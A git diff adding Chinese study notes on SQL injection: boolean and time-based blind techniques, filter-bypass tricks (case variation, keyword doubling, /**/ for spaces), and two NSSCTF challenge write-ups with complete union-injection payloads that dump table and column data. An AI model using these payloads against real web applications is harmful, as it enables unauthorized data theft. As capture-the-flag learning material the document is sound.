@@ -447,25 +447,232 @@ select count(*),concat_ws('-',database(),floor(rand(0)*2)) as jk from informatio
 ```
 通过不断修改limit后面的第一个参数显示出不通的内容
 ![alt text](image-303.png)
+
 还可以通过substring来解决
 
 
 
+### 布尔盲注
+**盲注**: 页面没有报错回显，不知道数据库具体返回值的情况下，对数据库中的内容进行猜解，实行sql注入
+**布尔盲注**: 数据页面只返回真假值的情况可以用布尔盲注
+真
+![alt text](image-304.png)
+假
+![alt text](image-305.png)
+如上图就是真假值的两种情况
+
+**关键函数**
+**ascii():** 把字母转化为对应数字，通过该函数把字母转化为数字再进行大小比较就可以判断数字是否正确,例如下面
+```sql
+?id=1' and ascii('e')>=101--+
+```
+**substr((),1,1)**:由于ascii函数不能把所有字母转化为ascii码，所以用substr
+```sql
+select ascii(substr(select database(),1,1));
+```
+通过这两个函数的配合使用结合二分法不断比大小直到得到所有结果
+如下面语句查表
+```sql
+?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>100--+
+```
+此处由于只有真假值所以不需要用group_concat，而是使用limit 0，1从第0行开始显示1行，从结果的第一行数据一次查询
+
+注意布尔盲注的闭合判断方式使用排除法
+![alt text](image-306.png)
+
+### 时间盲注
+**时间盲注**:web页面只返回一个正常页面，利用页面响应时间不通逐个猜解
+**关键函数**
+**sleep():**
+通过sleep函数可以判断很多，例如先判断闭合方式
+```sql
+?id=1" and sleep(3)--+
+```
+执行这条语句回直接刷新说明and后面的语句没有执行即不是双引号闭合
+```sql
+?id=1' and sleep(3)--+
+```
+执行上面这条语句回等待三秒再刷新说明时单引号闭合
+
+**if语句**
+**select if(condition,ture,flase);** 当条件为真的时候执行ture否者执行flase
+```sql
+select if(1=1,sleep(0),sleep(3));
+```
+下面展示如何查询数据库名
+```sql
+?id=1' and if(scaii(substr((select database()),1,1))>100,sleep(0),sleep(3))--+
+```
+和布尔盲注原理基本一样，只不过这里是利用比较大小通过不通反应时长来判断条件是否成立
+### 注释符过滤
+**注释的原因**
+网页源代码中有这样一句
+```sql
+$sql="select * from users where id='$id' limit 0,1";
+```
+当在网页输入 **?id=1** 时，会变为
+```sql
+$sql="select * from users where id='1' limit 0,1";
+```
+当输入 **?id=1 and 1=1** 则
+```sql
+$sql="select * from users where id='1 and 1=1' limit 0,1";
+```
+但是**1 and 1=1**已经内单引号给包裹起来实体化了，因此失去了and的功能
+接下来如果输入 **?id=1' and 1=1**,则
+```sql
+$sql="select * from users where id='1' and 1=1' limit 0,1";
+```
+这样虽然把前半部分的单引号给处理了，但是后半部分还是多在那里，所以这里需要用到**注释符**
+```sql
+$sql="select * from users where id='1' and 1=1'--+ limit 0,1";
+```
+这样就通过注释把单引号处理了
+
+**如何判断页面过滤对象：** 从最简单的注入语句开始，一步一步增加复杂性，通过此方法判断过滤对象
+![alt text](image-319.png)
+如上图所示，根据1报错可以知道这是单引号闭合，但是加上--+或者#都没法进行注释
+![alt text](image-320.png)
+原因如下：
+源代码中含有过滤的语句
+```php
+$reg="/#/";
+$reg1="--";
+$replace="";
+$id=preg_replace($reg,$replace,$id);
+$id=preg_replace($reg1,$replace,$id);
+```
+**绕过的方法:**
+1. 手动再多加一个',例如?id=1' and 1=1',这样就可以把后半部分的'手动闭合
+2. 如果是双引号闭合，就手动添加一个双引号
+3. 使用and的方法 
+```sql
+?id=1' order by 4 and  '1'='1
+```
+这样还是相当于添加了一个'
+
+### and和or过滤的绕过
+过滤源代码
+```php
+function balacklist($id){
+    $id=preg_replace('/or/i'."",$id);
+    $id=preg_replace('/and/i'."",$id);
+
+    return $id;
+}
+```
+**绕过方法：**
+1. **大小写绕过**
+例如
+    ```sql
+    ?id=1' anD 1=1--+
+    ```
+2. **复写绕过：**
+    ```sql
+    ?id=1' anandd 1=1--+
+    ```
+    注意这里的复写是指再=在and里面再写一个and
+3. **用&&代替and用||代替or**，这里通常写成url编码的形式
+    ```sql
+    ?id=1' %26%26 1=2--+
+    ```
+### 空格过滤
+**绕过方法：**
+1. 使用+代替空格
+2. 使用url编码代替空格%20，%A0
+3. 用注释符/**/代替空格
+4. 使用报错输入，配合||让空格不出现
+    ```sql
+    ?id=1||extractvalue(1,concat('~',database()))||1'='1
+    ```
+
+### 逗号过滤
 
 
 
 
 
 
+## 例题
+### [SWPUCTF 2021 新生赛]easy_sql
+>url:https://www.nssctf.cn/problem/387
+>union注入
 
+根据提示，参数时wllm
+![alt text](image-307.png)
+然后判断闭合方式为单引号闭合
+![alt text](image-308.png)
+通过group by判断分组为3
+![alt text](image-309.png)
+判断回显位
+![alt text](image-310.png)
+然后拿表名
+```sql
+?wllm=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+
+```
+![alt text](image-311.png)
+然后拿users的列名
+```sql
+?wllm=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'--+
+```
+![alt text](image-312.png)
+然后拿里面的内容
+![alt text](image-313.png)
+wtf里面居然没有flag，那么去看一下哪个test_tb表
+拿test_tb的列名
+```sql
+?wllm=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='test_tb'--+
+```
+![alt text](image-314.png)
+拿flag
+![alt text](image-315.png)
 
+### [SWPUCTF 2022 新生赛]ez_sql
+>url:https://www.nssctf.cn/problem/2881
 
+![alt text](image-316.png)
+打开题目出现上图，而且提示为post注入
+随便写一点，得到一个假的flag
+![alt text](image-317.png)
 
-
-
-
-
-
-
-
+判断为单引号闭合
+![alt text](image-321.png)
+但是注释的时候用--+没用，所以这里--+是被过滤的，尝试用#代替--+
+![alt text](image-322.png)
+用#有用，然后使用group by判断列数
+![alt text](image-323.png)
+有上面图片发现group by之间的空格没了，说明这里的空格被过滤了，这里先试一下/**/能不能绕过
+```
+nss=1'/**/group/**/by/**/4# 
+```
+![alt text](image-325.png)
+通过判断列数为3
+![alt text](image-326.png)
+判断回显位的时候发现union也被过滤了，然后使用双写绕过
+这里还有一个坑就是nss=-1回显位竟然没有我们想要的东西，那么就更夸张一点来个-123
+```sql
+nss=-123'/**/ununionion/**/select/**/1,database(),3#
+```
+![alt text](image-327.png)
+然后就是常规的拿列名拿表名的操作
+先拿表名
+```sql
+nss=-123'/**/ununionion/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()#
+```
+![alt text](image-328.png)
+这里information变为infmation说明or被过滤了，双写绕过
+```sql
+nss=-123'/**/ununionion/**/select/**/1,2,group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=database()#
+```
+![alt text](image-329.png)
+然后拿列名,这里要注意and也被过滤了
+```sql
+nss=-123'/**/ununionion/**/select/**/1,2,group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_schema=database()/**/aandnd/**/table_name='NSS_tb'# 
+```
+![alt text](image-330.png)
+最后拿内容
+```sql
+nss=-123'/**/ununionion/**/select/**/1,2,group_concat(id,Secr3t,flll444g)/**/from/**/NSS_tb#         
+```
+![alt text](image-332.png)
 
